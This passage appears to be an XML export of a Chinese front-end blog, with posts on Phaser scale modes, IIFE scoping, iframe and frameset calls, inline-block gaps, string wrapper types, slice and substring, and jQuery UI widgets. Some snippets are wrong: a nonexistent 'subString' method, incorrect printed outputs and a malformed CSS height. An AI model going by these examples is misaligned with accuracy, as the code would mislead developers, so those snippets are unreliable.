SHOW_ALL12game.scale.scaleMode =Phaser.ScaleManager.SHOW_ALL;这种模式通过调整你的游戏大小，以适应父元素的大小，但会保持游戏的宽高比例。它不像EXACT_FIT这种模式，它不会扭曲你的游戏画面。它通过计算游戏的宽高比。然后再依据父元素的的大小调整Canvas尺寸，与此同时自动保持自身的宽高比。像这种以父元素大小为依据，有时会导致出现被称为“边框化”的效果：上图中浏览器窗口大小是705 x 670像素，而游戏的是800x600像素，为了适配窗口大小并保证宽高比不变，Phaser重置game大小为705x529像素，图中下方的黑色区域就是页面的剩余部分。The Scale Manager能使游戏在父元素中居中的功能，这能更好的改进边框化模式，下文会有这部分的详细介绍。缩放模式四： RESIZE12game.scale.scaleMode =Phaser.ScaleManager.RESIZE;RESIZE模式是创建一个和其父元素同样大小的Canvas元素，如果父元素是900x1200，那么游戏大小也是900x1200像素.在这个适配模式下，Phaser引擎一直会跟踪父元素的大小变化，如果父元素大小发生变化，那游戏大小就会跟着变化。它和SHOW_ALL模式的不同在于RESIZE的canvas元素缩放并非真正的缩放去适配父元素，而是1:1的去匹配显示，它只是基于父元素在其或大或小的区域绘制。看下面两张图，第一张浏览器窗口大小是638x584而下面这张也是相同游戏大小而浏览器窗口大小重设为855 x 584正如你看到的，在第二张图你可以看到更多的背景。而随着浏览器窗口变大会有更多的图像变得可见。这个模式就是一个真正的响应式游戏模式，但依赖于你的代码要如何利用额外的空间，以及如何使用它。Phaser有一些功能在FlexGrid类中，但还在测试中。Resize callbackThe RESIZE模式还有个一额外的功能是其他模式没有的，如果游戏State有一个resize方法时，无论何时父元素大小发生变化时这个方法都会被调用。同时会有传入两个参数：’width‘ 和 ’height‘。可以通过这两个参数去调整游戏对象的位置。例如：我们要创建两个精灵。1234kirito = game.add.sprite(0, game.world.bounds.bottom, 'kirito');kirito.anchor.y = 1;asuna = game.add.sprite(game.world.bounds.right, 0, 'asuna');asuna.anchor.x = 1;两个精灵分别被放置在游戏的左下角和右上角，然后通过锚点(anchor)这个属性，我们不需要担心游戏中精灵显示不全。此时游戏开始看起来就像下图：在State中有一个resize方法：1234function resize(width, height) &#123; kirito.y = height; asuna.x = width;&#125;随着浏览器的大小变化，此函数将被反复调用。给定的参数可以用来在游戏中调整两个精灵的位置，所以他们仍然在游戏的左下方和右上方，无论如何缩放。下图就是浏览器窗口被调整更大后的效果你可以看到，虽然浏览器现在比背景图像还大，但精灵们仍然在各自的岗位上。这是所有响应的游戏设计的基础。缩放模式五：USER_SCALE1game.scale.scaleMode = Phaser.ScaleManager.USER_SCALE;最后一个模式是USER_SCALE,这个模式是在Phaser2.2版本出现的，它允许自定义动态缩放，它与setUserScale方法组合使用：1game.scale.setUserScale(hScale, vScale, hTrim, vTrim);参数hScale和vScale控制如何缩放游戏，1代表不缩放，0.5代表缩小一半，2代表放大2倍，以此类推，在Phaser中可以任意缩放。参数hTrim和vTrim，必须是整数，用来定义缩放后从画布的水平或垂直尺寸删除的值。它的计算方式如下：12canvas.width = (game.width * hScale) - hTrimcanvas.height = (game.height * vScale) - vTrim你可以在游戏任何位置调用setUserScale方法，但通常你会想在resize时回调，这有两个选择，一个是setResizeCallback方法，另一个是onSizeChange监听：12game.scale.setResizeCallback(callback, context);game.scale.onSizeChange.add(callback, context);回调函数被调用之前的大小计算。这是调用自定义动态缩放setuserscale适当的地方。回调函数提供两个参数scale和parentBounds，scale是ScaleManager对象，parentBounds则是一个Phaser.Rectangle，父元素的大小。注意，这个回调函数会有以下问题：父元素或canvas大小没有变化也有可能被调用；不像onSizeChange，它运行在canvas上的保证是update可能被preUpdate调用，即使游戏已经暂停了。&nbsp;]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser屏幕适配</tag>
        <tag>phaser游戏开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[匿名函数模仿块级作用域]]></title>
    <url>%2F2015%2F09%2F17%2F%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E6%A8%A1%E4%BB%BF%E5%9D%97%E7%BA%A7%E4%BD%9C%E7%94%A8%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[问题&emsp;&emsp;【无块级作用域】JavaScript中没有块级作用域的概念。这意味着在块语句中定义的变量，实际上是在包含函数中而非语句中创建的。12345678function outputNumbers(count)&#123; for(var i = 0; i &lt; count; i++)&#123; alert(i); &#125; console.log(i);&#125;outputNumbers(2);//弹出0,1输出2//变量i是定义在outputNumbers()的活动对象中的，因此从它有定义开始，就可以在函数内部随时访问它。&emsp;&emsp;函数中的多重声明，对于多次声明同一个变量，JavaScript只会对后续的声明视而不见。12345678function outputNumbers(count)&#123; for(var i = 0; i &lt; count; i++)&#123; alert(i); &#125; var i; console.log(i);&#125;outputNumbers(2);//弹出0,1输出2解决过程&emsp;&emsp;【过渡写法】先创建一个匿名函数，并把匿名函数赋值给变量someFunction，然后通过在函数名称后面添加一对圆括号来调用函数。1234var someFunction = function()&#123; //这里是块级作用域&#125;;someFunction();&emsp;&emsp;【错误写法】这种匿名函数直接跟圆括号会报错，因为JavaScript将function关键字当作一个函数声明的开始，而函数声明后面不能跟圆括号123function()&#123; //这里是块级作用域&#125;();//出错&emsp;&emsp;【正确写法】而函数表达式的后面可以跟圆括号，要将函数声明转换成函数表达式，只要给函数整体套上一个圆括号即可。1234(function()&#123; //这里是块级作用域&#125;)();//定义并立即调用了一个匿名函数。将函数声明包含在一对圆括号中，表示它实际上是一个函数表达式。而紧随其后的另一对圆括号会立即调用这个函数。解决办法&emsp;&emsp;【设置块级作用域】在重写后的outputNumbers()函数中，在for循环外部插入了一个私有作用域。在匿名函数中定义的任何变量，都会在执行结束时被销毁。因此，变量i只能在循环中使用。123456789function outputNumbers(count)&#123; (function()&#123; for(var i = 0; i &lt; count; i++)&#123; alert(i); &#125; &#125;)() console.log(i);&#125;outputNumbers(2);//弹出0,1,然后报错，提示i is not defined应用场景&emsp;&emsp;这种技术经常在全局使用域中被用在函数外部，从而限制向全局作用域中添加过多的变量和函数。通过创建私有作用域，每个开发人员既可以使用自己的变量，又不必担心搞乱全局作用域。1234567(function()&#123; var now = new Date(); if(now.getMonth() === 0 &amp;amp;&amp;amp; now.getDate() === 1)&#123; alert("happy new year!"); &#125;&#125;)();//代码中的变量now是匿名函数中的局部变量，不必在全局作用域中创建它。好处&emsp;&emsp;这种做法可以减少闭包占用的内存问题，因为没有指向匿名函数的引用，只要匿名函数执行完毕，就可以立即销毁其作用域链了。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>匿名函数模仿块级作用域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[frameset，iframe框架之间如何互相调用变量、函数]]></title>
    <url>%2F2015%2F09%2F16%2Fframeset%EF%BC%8Ciframe%E6%A1%86%E6%9E%B6%E4%B9%8B%E9%97%B4%E5%A6%82%E4%BD%95%E4%BA%92%E7%9B%B8%E8%B0%83%E7%94%A8%E5%8F%98%E9%87%8F%E3%80%81%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;以往一直在编写的都是前台的UI，很少使用到frameset、iframe，对其了解也是十分有限，只是知道其可以为其当前页面引入html文件成为当前页的一部分，但是这两天在做后台UI界面的时候，发现这样的框架也是有相当多知识点在里面的。那框架是啥？可以这样说：通过使用框架，你可以在同一个浏览器窗口中显示不止一个页面。每份HTML文档称为一个框架，并且每个框架都独立于其他的框架。那么关于框架，有几个方面是需要我了解的：&nbsp;（1）获得html页面上的framewindow.frames可以获得本页面上所有frame集合，用法与document.forms,document.imgs的用法相似，这是这里用的是window对象，获取某个框架可以这样做window.frames[0]、window.frames[‘frameName’]、frames[‘frameName’]、frames[0]、self.frames[0]，此处self与window等价，相当于本页面的window对象。这里也还要再看两个属性,contentWindow、contentDocument两个属性，也是可以用来获取子窗口，框架的window对象的。contentWindow 兼容各个浏览器，可取得子窗口的 window 对象。contentDocument Firefox 支持，&gt; ie8 的ie支持。可取得子窗口的 document 对象。假如我要刷新本页面中第一个框架的页面，可以怎么做：1window.frames[0].contentWindow.location.reload();&nbsp;（2）父框架调用子框架的变量或函数结合上面说的获得页面上的frame，那么调用子框架的变量或是函数可以这样来：123frames[0].a;frames[0].refresh();alert(frames[0].location.href);这是调用第一个框架里面的a变量和refresh函数。&nbsp;（3）子框架调用父框架的变量或函数对于子框架调用父框架的这种情况下，window有个属性叫parent，用来调用上层框架的，所以可以这样来：12window.parent.a;window.parent.refresh();这是调用子框架调用父框架的a变量和refresh函数。&nbsp;（4）兄弟框架之间的调用可以通过它们的父框架来相互调用，可以这样做12self.parent.frames['child1'];self.parent.frames['child2'];&nbsp;（5）多层框架的调用1window.frames[&apos;child_1&apos;].frames[&apos;sub_child_3&apos;];&nbsp;（6）顶层框架首先需要判断是否为顶层框架，也就是根，可以这样来做：123if(self==window.top)&#123; //....&#125;window的另外一个属性top，它表示对顶层框架的引用，这可以用来判断一个框架自身是否为顶层框架基本关于frameset和iframe之间的互相调用知识点就这些！&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>frameset 调用变量</tag>
        <tag>iframe调用变量函数</tag>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决dispaly:inline-block遗留间隙的问题]]></title>
    <url>%2F2015%2F09%2F16%2F%E8%A7%A3%E5%86%B3dispalyinline-block%E9%81%97%E7%95%99%E9%97%B4%E9%9A%99%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;今天做一个项目 。本来我打算是作成表格的 ，后来觉得太费事直接搞成一个div 里面直接放四个a ，然后我将a 设置成inline-block。刚开始还没发现任何间隙问题，(对了说到这里 博主给新手介绍一个方法 如果对div 布局 或者大小 等有问题的 不妨设置一下他的背景色，)回归主题这时候我给a设置一个border-bottom 问题来了 出现间隙了我仅是设置a的display值处理的方法空隙是有标签之间的空隙造成的所以可以1）将a标签分开写2）inline-block的父元素设置font-size等于0，在inline-block的font-size设置为正常值，也是可以的3）如果需要设置字体的元素比较多，一般也可以用margin负值解决的4）还有wordspacing letterspacing 等等好多方法&nbsp;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>dispaly:inline-block 间隙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript中的string拥有方法(Method)的原因]]></title>
    <url>%2F2015%2F09%2F15%2Fjavascript%E4%B8%AD%E7%9A%84string%E6%8B%A5%E6%9C%89%E6%96%B9%E6%B3%95method%E7%9A%84%E5%8E%9F%E5%9B%A0%2F</url>
    <content type="text"><![CDATA[我们都知道，JavaScript数据类型分两大类，基本类型（或者称原始类型）和引用类型。基本类型的值是保存在栈内存中的简单数据段，它们是按值访问的。JS中有五种基本类型：Undefined、Null、Boolean、Number和String。引用类型的值是保存在堆内存中的对象，它的值是按引用访问的。引用类型主要有Object、Array、Function、RegExp、Date。对象是拥有属性和方法的，所以我们看到下面这段代码一点也不奇怪.1234var favs=['鸡蛋','莲蓬'];favs.push('秋葵');console.log(favs);//["鸡蛋", "莲蓬", "秋葵"]console.log(favs.length);//3Array是引用类型，所以它自然可以拥有属性(length)和方法(push)，这天经地义地就像夏天一定要吃冰淇淋一样。但是，再看下面的代码，仔细想想，这这这，合法吗？123var realMessage="Said I love you but I lied";var myMessage=realMessage.substring(5,15);console.log(myMessage); //"I love you"有一个心碎的女纸任性地对一个用来分手的字符串任性地执行了“substring”方法，然后开心地看着剪辑版睡过去了。可是可是可是，不是说string是基本类型吗，为什么它可以拥有方法？？还有没有王法啊青天大老爷！其实，这一切，都是因为有个叫“基本包装类型”的东东。这个基本包装类型特别耿直，是真正的“事了拂衣去，深藏功与名”！基本包装类型除了一开始提到的Object、Array等引用类型，JavaScript还为我们提供了三种特殊的引用类型：String、Number和Boolean，方便我们操作对应的基本类型。继续看上面的剪辑字符串的例子，有没有注意到，尽管使用了substring方法，realMessage本身的值是不会变的，调用这个方法只是返回了一个新的字符串。这就是基本包装类型的作用了。本来你是没有方法的，但是你想用方法的时候，你尽管调，对应的基本包装类型有这个方法就行。例如上面的substring方法，string这个基本类型是不可能有这个方法的，但是String这个包装类型有啊，它会吭吭哧哧地把这个方法执行完把结果返回。在执行到：这行代码时，发生了很多事。首先，它会从内存中读取realMessage的值。当处于这种读取模式下的时候，后台就开始干活了。JS高程是这样描述后台完成的这些动作的：1.创建String类型的一个实例；2.在实例上调用指定的方法；3.销毁这个实例上面的例子可以用这样的代码来说明：所以，这样我们就明白了，并不是基本类型string执行了自身方法，而是后台为它创建了一个对应的基本包装类型String，它根据基本类型的值实例化出了一个实例，让这个实例去调用指定方法，最后销毁自己，感天动地有木有。注意最后一步基本包装类型“会销毁”的特性，这决定了我们不能为基本类型值添加自定义属性和方法。我给“me“这个字符串添加了age属性，值设为美好的18岁，然并卵，再次访问时，这个属性已经渺无踪迹了。这是因为:执行到第二行代码属性赋值时，后台创建了一个基本包装类型的实例，这个age属性确实挂到实例上去了，但是紧跟着，这个实例就被销毁了。执行到第三行时，又重新创建了新的基本包装类型的实例，自然是没有age属性的。显示使用基本包装类型除了在字符串处于读取模式下，后台会帮我们创建基本包装类型实例时，我们自己也可以显示地创建。123var str=new String("hello");var str2=str.toUpperCase();console.log(str2);//"HELLO:这样与后台帮我们创建时变量中保存的东西是不同的。1234var str1=new String("hello");var str2="hello";typeof str1 //"object"typeof str2 //"string"&nbsp;总结多亏了有基本包装类型，我们操作string、boolean、number这三种基本类型更方便了。每当读取这三种基本类型值时，后台会创建对应的包装类型实例，这个实例会调用指定方法，调用完会被销毁。这种短暂的生命周期决定了我们不能为基本类型添加自定义的属性和方法。我们再来看下javascript中String类的subString()方法和slice()方法最近在看《Javascript高级程序设计》一书，在书中发现一些以前没有接触过的且比较实用的技巧和知识点，想通过博客记录一下，以加深记忆。12345var strObj = new String("hello world");alert(strObj.slice(3)); // 输出结果："ol world"alert(strObj.subString(3)); // 输出结果："ol world"alert(strObj.slice(3, 7)); // 输出结果："lo w"alert(strObj.subString(3,7)); // 输出结果："lo w"由以上代码的输出结果可已看出，slice()方法和subString()方调用方法法和输出结果完全一样，这两种方法返回的都是要处理的字符串的子串，都接受一个或两个参数，第一个参数是要获取的子串的起始位置，第二个参数是要获取子串的终止位置，如果第二个参数省略终止位置就默认为字符串的长度，且两个方法都不改变String对象自身的值。为什么有两个功能完全相同的方法呢？事实上，这两个方法并不完全相同，不过只在参数为负值时，他们处理参数的方式稍有不同。对于负数参数，slice()方法会用字符串的长度加上参数，subString()方法将其作为0处理，例如：12345var strObj = new String("hello world");alert(strObj.slice(-3)); // 输出结果："rld"alert(strObj.subString(-3)); // 输出结果："hello world"alert(strObj.slice(3,-4)); // 输出结果："lo w"alert(strObj.subString(3,-4)) // 输出结果："hel"这样既可看到slice()和subString()方法的主要不同。当只有参数-3时，slice()返回”rld”，subString()则返回”hello world”。这是因为对于字符串”hello world”，slice(-3)将被转换成slice(8)，而subString(-3)则转化成subString(0)。同样，使用3和-4差别也是很明显。slice()方法将被转换成slice(3,7)，与前面的例子相同，返回”lo w”。而subString()方法则将这个两个参数解释为subString(0,3)，实际上是：subString(0,3)，因为subString()总是把较小的参数作为起始位，较大的数字最为终止位。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JavaScript中的string拥有方法(Method)的原因</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js简单实现input文本框实现宽度自适应]]></title>
    <url>%2F2015%2F09%2F15%2Fjs%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0input%E6%96%87%E6%9C%AC%E6%A1%86%E5%AE%9E%E7%8E%B0%E5%AE%BD%E5%BA%A6%E8%87%AA%E9%80%82%E5%BA%94%2F</url>
    <content type="text"><![CDATA[本章节介绍一下如何让一个文本框的宽度能够随着文本框中的内容的宽度增长而增长，也就是能够实现宽度自适应效果。代码实例如下:123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;www.npm8.com&lt;/title&gt;&lt;script type="text/javascript"&gt;window.onload=function()&#123;var otxt=document.getElementById("txt");otxt.onkeyup=function()&#123;this.size=(this.value.length&gt;4?this.value.length:4);&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="text" id="txt" size="4"/&gt;&lt;/body&gt;&lt;/html&gt;&nbsp;以上代码实现了我们的要求，代码非常的简单，注册onkeyup事件处理函数，此函数可以判断当前输入内容的长度是否大于默认长度，如果不大于，则文本框的长度就是4，否则就是输入内容的长度。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>input文本框宽度自适应</tag>
        <tag>input文本框自适应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一组时尚的侧边栏菜单和下拉列表效果]]></title>
    <url>%2F2015%2F09%2F15%2F%E4%B8%80%E7%BB%84%E6%97%B6%E5%B0%9A%E7%9A%84%E4%BE%A7%E8%BE%B9%E6%A0%8F%E8%8F%9C%E5%8D%95%E5%92%8C%E4%B8%8B%E6%8B%89%E5%88%97%E8%A1%A8%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;这是一款非常时尚的可伸展的侧边栏菜单和select下拉列表以及手风琴式垂直下拉列表UI设计效果。它们通过简单的CSS样式设置，以及和jQuery，jqueryUI的配合，制作出非常时尚的web组件UI设计效果。HTML结构侧边栏的HTML结构使用在中嵌套无序列表的HTML结构。12345678910111213141516171819&lt;div id="sidebar-menu"&gt;&lt;div id="toggleMenu"&gt;&lt;div class="list"&gt;&lt;/div&gt;&lt;div class="thumbs"&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul&gt;&lt;li class="DASHBOARD"&gt;&lt;span&gt;DASHBOARD&lt;/span&gt;&lt;/li&gt;&lt;li class="USERS"&gt;&lt;span&gt;USERS&lt;/span&gt;&lt;/li&gt;&lt;li class="PRIORITY"&gt;&lt;span&gt;PRIORITY&lt;/span&gt;&lt;/li&gt;&lt;li class="COLLECTIONS"&gt;&lt;span&gt;COLLECTIONS&lt;/span&gt;&lt;/li&gt;&lt;li class="ARCHIVED"&gt;&lt;span&gt;ARCHIVED&lt;/span&gt;&lt;/li&gt;&lt;li class="DELETED"&gt;&lt;span&gt;DELETED&lt;/span&gt;&lt;/li&gt;&lt;li class="TRENDS"&gt;&lt;span&gt;TRENDS&lt;/span&gt;&lt;/li&gt;&lt;li class="TASKS"&gt;&lt;span&gt;TASKS&lt;/span&gt;&lt;/li&gt;&lt;li class="FILTERS"&gt;&lt;span&gt;FILTERS&lt;/span&gt;&lt;/li&gt;&lt;li class="STATS"&gt;&lt;span&gt;STATS&lt;/span&gt;&lt;/li&gt;&lt;li class="SETTINGS"&gt;&lt;span&gt;SETTINGS&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;select下拉列表的HTML结构如下：123456789101112&lt;div id="dropdown"&gt;&lt;div id="drop-select"&gt;Select a branch&lt;/div&gt;&lt;div id="dropdown-list"&gt;&lt;div class="header"&gt;Group header&lt;/div&gt;&lt;ul&gt;&lt;li&gt;Filmore District&lt;/li&gt;&lt;li&gt;Mission District&lt;/li&gt;&lt;li&gt;Northshare Beach&lt;/li&gt;&lt;li&gt;Some other branch&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;手风琴垂直下拉列表的HTML结构如下：1234567891011121314151617181920212223&lt;div class="sortable-accordion"&gt;&lt;h3&gt;GROUP 1&lt;/h3&gt;&lt;div class="inner"&gt;&lt;ul class="sortable"&gt;&lt;li class="ui-state-default"&gt;Item 1&lt;/li&gt;...&lt;/ul&gt;&lt;/div&gt;&lt;h3&gt;GROUP 2&lt;/h3&gt;&lt;div class="inner"&gt;&lt;ul class="sortable"&gt;&lt;li class="ui-state-default"&gt;Item 1&lt;/li&gt;...&lt;/ul&gt;&lt;/div&gt;&lt;h3&gt;GROUP 3&lt;/h3&gt;&lt;div class="inner"&gt;&lt;ul class="sortable"&gt;&lt;li class="ui-state-default"&gt;Item 1&lt;/li&gt;...&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;CSS样式&emsp;&emsp;这3个UI组件的CSS样式都非常简单。其中侧边栏菜单的样式如下：它使用绝对定位来设置各个元素的位置，并给各个元素设置适当的大小，颜色和padding值。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#sidebar-menu&#123; background:#229bdc; overflow:hidden; border-radius:5px; position:absolute; top: 60px; left: 0; height:62 0px; width:55px; color:#abe2ff; font-size:12px; font-weight:900; -webkit-transition: all 200ms ease-out; -moz-transition: all 300ms cubic-bezier(0.000, 0.995, 0.990, 1.000); -ms-transition: all 300ms cubic-bezier(0.000, 0.995, 0.990, 1.000); -o-transition: all 300ms cubic-bezier(0.000, 0.995, 0.990, 1.000); transition: all 300ms cubic-bezier(0.000, 0.995, 0.990, 1.000);&#125;#sidebar-menu.animate&#123; width:210px; -webkit-transition: all 200ms ease-out; -moz-transition: all 300ms cubic-bezier(0.000, 0.995, 0.990, 1.000); -ms-transition: all 300ms cubic-bezier(0.000, 0.995, 0.990, 1.000); -o-transition: all 300ms cubic-bezier(0.000, 0.995, 0.990, 1.000); transition: all 300ms cubic-bezier(0.000, 0.995, 0.990, 1.000);&#125;#toggleMenu&#123; background:#1888c4; height:37px;&#125;#toggleMenu .list&#123; position:absolute; top: 12px; cursor:pointer; right: 8px;; height:30px; width:30px; height:30px; background:url("../img/toggle-list.png") 0 0 no-repeat;&#125;#toggleMenu .thumbs&#123; position:absolute; display:none; top: 9px; cursor:pointer; right: 3px; height:30px; width:30px; height:30px; background:url("../img/toggle-thumbs.png") 0 0 no-repeat;&#125;#sidebar-menu li&#123; background:url("../img/sidemenu-sprite.png") 0 0 no-repeat; padding: 15px 0 15px 54px; margin: 1px 4px 1px 4px; list-style: none;&#125;最后为菜单列表中的每个元素设置一个背景图像作为小图标。JAVASCRIPT&emsp;&emsp;在垂直手风琴下拉列表效果中，每一个列表项都是可以用鼠标进行拖动排序的。这是通过jqueryUI的sortable()方法来实现的。1$('.sortable').sortable(&#123; placeholder: 'ui-sortable-placeholder' &#125;).find('li').append('');&emsp;&emsp;其它的操作都是在点击相应元素的时候使用toggleClass()来切换相应的class，以及显示和隐藏相应的元素。查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>下拉列表效果</tag>
        <tag>侧边栏菜单效果</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于jQuery滑动杆实现购买日期选择]]></title>
    <url>%2F2015%2F09%2F15%2F%E5%9F%BA%E4%BA%8Ejquery%E6%BB%91%E5%8A%A8%E6%9D%86%E5%AE%9E%E7%8E%B0%E8%B4%AD%E4%B9%B0%E6%97%A5%E6%9C%9F%E9%80%89%E6%8B%A9%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;这是一款基于jQuery的滑动杆购买日期选择插件，它的外观仿的是阿里云的服务器购买日期选择界面。这款jQuery插件非常适合在一些虚拟产品购买页面上使用，它可以帮助你的用户快速选择产品的购买日期，十分方便。效果图如下：实现的代码。html代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;center&gt;&lt;div class="slider-date" id="slider-date-1"&gt;&lt;!--底层--&gt;&lt;ul class="slider-bg clearfix"&gt;&lt;li&gt;1&lt;/li&gt;&lt;li&gt;2&lt;/li&gt;&lt;li&gt;3&lt;/li&gt;&lt;li&gt;4&lt;/li&gt;&lt;li&gt;5&lt;/li&gt;&lt;li&gt;6&lt;/li&gt;&lt;li&gt;7&lt;/li&gt;&lt;li&gt;8&lt;/li&gt;&lt;li&gt;9&lt;/li&gt;&lt;li&gt;1年&lt;/li&gt;&lt;li&gt;2年&lt;/li&gt;&lt;li&gt;3年&lt;/li&gt;&lt;/ul&gt;&lt;!--互动层--&gt;&lt;div class="slider-bar"&gt;&lt;ul class="slider-bg clearfix"&gt;&lt;li&gt;1&lt;span&gt;1个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;2&lt;span&gt;2个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;3&lt;span&gt;3个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;4&lt;span&gt;4个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;5&lt;span&gt;5个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;6&lt;span&gt;6个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;7&lt;span&gt;7个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;8&lt;span&gt;8个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;9&lt;span&gt;9个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;1年&lt;span&gt;1年&lt;/span&gt;&lt;/li&gt;&lt;li&gt;2年&lt;span&gt;2年&lt;/span&gt;&lt;/li&gt;&lt;li&gt;3年&lt;span&gt;3年&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;!--滑块按钮--&gt;&lt;a href="javascript:;" class="slider-bar-btn"&gt;&lt;i&gt;&lt;/i&gt;&lt;i&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class="slider-date" id="slider-date-2"&gt;&lt;!--底层--&gt;&lt;ul class="slider-bg clearfix"&gt;&lt;li&gt;1&lt;/li&gt;&lt;li&gt;2&lt;/li&gt;&lt;li&gt;3&lt;/li&gt;&lt;li&gt;4&lt;/li&gt;&lt;li&gt;5&lt;/li&gt;&lt;li&gt;6&lt;/li&gt;&lt;li&gt;7&lt;/li&gt;&lt;li&gt;8&lt;/li&gt;&lt;li&gt;9&lt;/li&gt;&lt;li&gt;1年&lt;/li&gt;&lt;li&gt;2年&lt;/li&gt;&lt;li&gt;3年&lt;/li&gt;&lt;/ul&gt;&lt;!--互动层--&gt;&lt;div class="slider-bar"&gt;&lt;ul class="slider-bg clearfix"&gt;&lt;li&gt;1&lt;span&gt;1个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;2&lt;span&gt;2个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;3&lt;span&gt;3个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;4&lt;span&gt;4个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;5&lt;span&gt;5个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;6&lt;span&gt;6个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;7&lt;span&gt;7个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;8&lt;span&gt;8个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;9&lt;span&gt;9个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;1年&lt;span&gt;1年&lt;/span&gt;&lt;/li&gt;&lt;li&gt;2年&lt;span&gt;2年&lt;/span&gt;&lt;/li&gt;&lt;li&gt;3年&lt;span&gt;3年&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;!--滑块按钮--&gt;&lt;a href="javascript:;" class="slider-bar-btn"&gt;&lt;i&gt;&lt;/i&gt;&lt;i&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class="slider-date" id="slider-date-3"&gt;&lt;!--底层--&gt;&lt;ul class="slider-bg clearfix"&gt;&lt;li&gt;1&lt;/li&gt;&lt;li&gt;2&lt;/li&gt;&lt;li&gt;3&lt;/li&gt;&lt;li&gt;4&lt;/li&gt;&lt;li&gt;5&lt;/li&gt;&lt;li&gt;6&lt;/li&gt;&lt;li&gt;7&lt;/li&gt;&lt;li&gt;8&lt;/li&gt;&lt;li&gt;9&lt;/li&gt;&lt;li&gt;1年&lt;/li&gt;&lt;li&gt;2年&lt;/li&gt;&lt;li&gt;3年&lt;/li&gt;&lt;/ul&gt;&lt;!--互动层--&gt;&lt;div class="slider-bar"&gt;&lt;ul class="slider-bg clearfix"&gt;&lt;li&gt;1&lt;span&gt;1个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;2&lt;span&gt;2个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;3&lt;span&gt;3个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;4&lt;span&gt;4个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;5&lt;span&gt;5个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;6&lt;span&gt;6个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;7&lt;span&gt;7个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;8&lt;span&gt;8个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;9&lt;span&gt;9个月&lt;/span&gt;&lt;/li&gt;&lt;li&gt;1年&lt;span&gt;1年&lt;/span&gt;&lt;/li&gt;&lt;li&gt;2年&lt;span&gt;2年&lt;/span&gt;&lt;/li&gt;&lt;li&gt;3年&lt;span&gt;3年&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;!--滑块按钮--&gt;&lt;a href="javascript:;" class="slider-bar-btn"&gt;&lt;i&gt;&lt;/i&gt;&lt;i&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/center&gt;css代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374ul, li &#123;padding: 0;margin: 0;list-style-type: none;&#125;.clearfix:after &#123;display: block;content: "";clear: both;&#125;.slider-date &#123;height: 36px;line-height: 36px;background: #e8e8e8;display: 